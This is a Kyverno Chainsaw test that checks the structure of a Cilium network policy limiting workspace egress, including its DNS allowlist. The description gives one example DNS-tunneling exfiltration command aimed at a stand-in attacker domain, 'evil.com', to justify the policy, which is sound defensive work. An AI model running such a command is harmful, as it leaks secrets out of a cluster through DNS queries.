apiVersion: chainsaw.kyverno.io/v1alpha1
kind: Test
metadata:
  name: workspace-egress-dns-allowlist
spec:
  description: |
    The chart-shipped CiliumNetworkPolicy `workspace-egress` is the SOLE
    workspace egress policy. It owns both L4 destinations (kube-dns,
    tightbeam-ctrl, airlock-ctrl) AND the L7 DNS allowlist on kube-dns.
    Default-deny otherwise.

    Why one CNP and not a K8s NetworkPolicy alongside: Cilium's
    documented L4-shadows-L7 merge semantics mean a sibling K8s NP that
    allows kube-dns:53 with no L7 nullifies the CNP's L7 allowlist.
    Verified empirically on Cilium 1.19.3.

    Without the L7 allowlist, a workspace can exfiltrate via DNS
    tunneling (`dig <base64-secret>.evil.com @kube-dns`), since L4-only
    permits the query and the resolver chain forwards it to the
    attacker's nameserver.

    This bucket asserts the CNP's structural shape:
      - name + namespace
      - endpointSelector labels
      - kube-dns egress with both matchName entries
      - tightbeam-ctrl:9090 egress
      - airlock-ctrl:9090 egress
    Catches deletion of any individual rule. The live DNS-probe is out of
    scope per the audit memo — it would test Cilium, not sycophant.
  bindings:
    - name: chart_ns
      value: e2e-test
  steps:
    - name: assert-workspace-egress-cnp-shape
      try:
        - assert:
            resource:
              apiVersion: cilium.io/v2
              kind: CiliumNetworkPolicy
              metadata:
                name: workspace-egress
                namespace: ($chart_ns)
              spec:
                endpointSelector:
                  matchLabels:
                    app.kubernetes.io/component: workspace
                    app.kubernetes.io/part-of: sycophant
                (egress[?toEndpoints[?matchLabels."k8s-app"=='kube-dns']]):
                  - toPorts:
                      - ports:
                          - port: "53"
                            protocol: UDP
                          - port: "53"
                            protocol: TCP
                        rules:
                          dns:
                            (contains(@[*].matchName, 'tightbeam-ctrl.e2e-test.svc.cluster.local')): true
                            (contains(@[*].matchName, 'airlock-ctrl.e2e-test.svc.cluster.local')): true
                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='tightbeam-ctrl']]):
                  - toPorts:
                      - ports:
                          - port: "9090"
                            protocol: TCP
                (egress[?toEndpoints[?matchLabels."app.kubernetes.io/name"=='airlock-ctrl']]):
                  - toPorts:
                      - ports:
                          - port: "9090"
                            protocol: TCP
